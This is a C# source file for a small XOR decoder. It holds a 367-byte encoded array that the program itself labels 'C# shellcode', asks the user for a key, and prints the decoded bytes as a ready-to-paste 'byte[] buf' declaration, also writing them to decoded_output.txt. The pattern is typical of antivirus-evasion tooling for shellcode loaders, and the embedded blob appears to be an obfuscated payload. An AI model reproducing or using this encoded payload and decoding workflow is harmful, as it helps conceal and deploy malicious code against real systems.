using System;
using System.Text;
using System.IO;

namespace XorDecoder
{
    public class Program
    {
        public static void Main(string[] args)
        {
            byte[] encoded = new byte[367] { 0x7d, 0x04, 0xfc, 0x7d, 0xb4, 0xdc, 0xe2, 0xca, 0xca, 0xca, 0x7d, 0xb8, 0x30, 0xda, 0xca, 0xca, 0xca, 0x7d, 0x8e, 0xa9, 0x26, 0xef, 0xcb, 0xc4, 0x52, 0xae, 0xb7, 0x7d, 0x04, 0x6d, 0x12, 0x7d, 0x18, 0xcd, 0xca, 0xca, 0xca, 0xd7, 0xc1, 0x55, 0x6e, 0x6e, 0x2f, 0x34, 0xad, 0x51, 0x48, 0x41, 0xea, 0xef, 0xcb, 0xc4, 0x13, 0xff, 0xf6, 0xf9, 0x74, 0xbe, 0x9d, 0x8c, 0x63, 0x7c, 0xd2, 0xe1, 0xad, 0xbd, 0xab, 0x8c, 0xd9, 0xfc, 0xaf, 0xe1, 0xad, 0xbd, 0xeb, 0x89, 0x63, 0x67, 0xff, 0x22, 0x54, 0xbf, 0x83, 0xcb, 0xe5, 0xe4, 0xfd, 0xe1, 0x17, 0x2f, 0x67, 0xf8, 0x33, 0xd2, 0xb5, 0x85, 0x06, 0xae, 0x0a, 0x0d, 0x5f, 0xef, 0xb6, 0x68, 0xc4, 0x02, 0x99, 0x85, 0x03, 0xe6, 0x3c, 0xfb, 0x06, 0x64, 0x89, 0xf8, 0x1a, 0xaf, 0x67, 0xcf, 0xa7, 0x97, 0xd3, 0xcf, 0x50, 0xa1, 0x32, 0xdb, 0x26, 0xef, 0xcb, 0x4f, 0xd2, 0x26, 0xb7, 0xa9, 0x26, 0xa7, 0x4e, 0x04, 0x26, 0xc9, 0xff, 0xa8, 0xf6, 0x64, 0x83, 0xdc, 0x02, 0xea, 0x3c, 0xe9, 0x06, 0xa6, 0xca, 0x14, 0xb1, 0xf8, 0xfa, 0x98, 0xef, 0xa7, 0x34, 0x0d, 0x13, 0x25, 0x83, 0x21, 0x6e, 0xee, 0x1d, 0x8c, 0x63, 0x6e, 0xf6, 0x68, 0xef, 0xe2, 0x67, 0x85, 0x53, 0x6f, 0x8f, 0x49, 0x53, 0x1e, 0x87, 0xc7, 0x1e, 0x8a, 0xbf, 0xec, 0x1f, 0x3e, 0xbe, 0x1c, 0x0a, 0xea, 0x3c, 0xe9, 0x02, 0xa6, 0xca, 0x14, 0x34, 0xef, 0x3c, 0xa5, 0x6e, 0xab, 0x40, 0x84, 0x4e, 0xe7, 0xb6, 0x79, 0x67, 0x64, 0xcf, 0x4c, 0x13, 0xf6, 0xf6, 0xf1, 0x78, 0xb6, 0x83, 0xc5, 0x82, 0xf4, 0xf6, 0xf1, 0x67, 0xb6, 0x8a, 0x9e, 0x1a, 0x2d, 0x5b, 0x89, 0x67, 0xbd, 0x34, 0x24, 0x0a, 0xef, 0xee, 0xf3, 0x6e, 0x64, 0xd9, 0x2d, 0x19, 0x51, 0x48, 0x56, 0x7b, 0x07, 0xc0, 0xc4, 0x52, 0xae, 0xc2, 0xda, 0x43, 0x9d, 0xf8, 0xf6, 0x7c, 0xca, 0xdb, 0xc5, 0x26, 0xb6, 0x8a, 0x7e, 0x1e, 0xd9, 0x91, 0xae, 0xd9, 0x3a, 0x82, 0x03, 0x93, 0xae, 0xb7, 0xa9, 0x26, 0x07, 0xd3, 0xc4, 0x52, 0xae, 0xe4, 0xdc, 0x45, 0x8c, 0xae, 0xb7, 0x21, 0xc8, 0xc2, 0xc5, 0x06, 0xaa, 0xb3, 0xa1, 0x31, 0xdb, 0xc3, 0xc0, 0x49, 0x81, 0xeb, 0xfe, 0x7b, 0xae, 0xed, 0x41, 0x2a, 0xef, 0xcb, 0xc4, 0x11, 0xdc, 0xde, 0xc4, 0x55, 0x80, 0xa5, 0x87, 0x1d, 0xfc, 0xf2, 0xa9, 0x67, 0xb7, 0x83, 0xf5, 0x9b, 0xef, 0x0d, 0xec, 0xa5, 0xb9, 0xcc, 0x3b, 0x87, 0xe6, 0x86, 0x60, 0x67, 0x55, 0x3b, 0x71, 0xf0, 0xf8, 0x48, 0x7c, 0x26, 0xef, 0xcb, 0xc4, 0x52, 0xae, 0xb7 };

            Console.Write("Enter the XOR key: ");
            string keyInput = Console.ReadLine();
            byte[] key = Encoding.ASCII.GetBytes(keyInput);
            byte[] decoded = new byte[encoded.Length];

            for (int i = 0; i < encoded.Length; i++)
                decoded[i] = (byte)(encoded[i] ^ key[i % key.Length]);

            StringBuilder hex = new StringBuilder();
            for (int i = 0; i < decoded.Length; i++)
                hex.AppendFormat(i < decoded.Length - 1 ? "0x{0:x2}, " : "0x{0:x2}", decoded[i]);

            string decodedOutput = $"Decoded C# shellcode:\nbyte[] buf = new byte[{decoded.Length}] {{{hex}}};";
            Console.WriteLine(decodedOutput);

            // Write the decoded output to a text file
            File.WriteAllText("decoded_output.txt", decodedOutput);
            Console.WriteLine("Decoded output written to decoded_output.txt");
        }
    }
}
